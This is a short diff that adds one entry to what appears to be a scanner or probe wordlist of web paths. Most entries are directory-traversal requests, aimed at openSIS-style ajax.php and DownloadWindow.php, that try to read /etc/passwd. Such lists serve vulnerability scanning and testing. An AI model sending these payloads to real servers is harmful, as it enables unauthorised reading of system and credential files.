@@ -2,3 +2,4 @@
 /install/index.php
 /opensis/ajax.php?modname=misc/../../../../../../../../../../../../../etc/passwd&bypass=Transcripts.php
 /ajax.php?modname=misc/../../../../../../../../../../../../../etc/passwd&bypass=Transcripts.php
+/DownloadWindow.php?filename=../../../../../../../../etc/passwd
